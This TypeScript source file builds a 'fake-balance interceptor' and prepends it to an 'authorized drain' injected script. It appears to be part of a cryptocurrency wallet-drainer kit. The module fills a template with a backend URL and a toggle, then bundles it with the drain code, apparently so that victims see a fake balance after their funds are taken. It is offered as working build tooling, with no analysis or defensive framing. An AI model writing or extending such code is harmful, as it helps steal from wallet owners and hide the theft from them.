/**
 * Build fake-balance interceptor snippet for authorized-drain-inject bundle.
 */
import { readFile } from 'node:fs/promises'
import { fileURLToPath } from 'node:url'
import path from 'node:path'

const __dirname = path.dirname(fileURLToPath(import.meta.url))

export function parseFakeBalanceAfterDrainEnv(value: string | undefined): boolean {
  const v = value?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

export async function buildMirrorFakeBalanceJs(opts: {
  backendUrl: string
  enabled: boolean
}): Promise<string> {
  const templatePath = path.join(__dirname, 'mirror-fake-balance.js')
  let template = await readFile(templatePath, 'utf8')
  template = template.replace(/__BACKEND_URL__/g, opts.backendUrl.replace(/\/$/, ''))
  template = template.replace(/__FAKE_BALANCE_AFTER_DRAIN__/g, String(opts.enabled))
  return template
}

/** Prepend fake-balance module before authorized drain IIFE */
export async function prependFakeBalanceModule(
  authorizedDrainJs: string,
  opts: { backendUrl: string; enabled: boolean },
): Promise<string> {
  if (!opts.enabled) return authorizedDrainJs
  const module = await buildMirrorFakeBalanceJs(opts)
  return `${module}\n\n${authorizedDrainJs}`
}
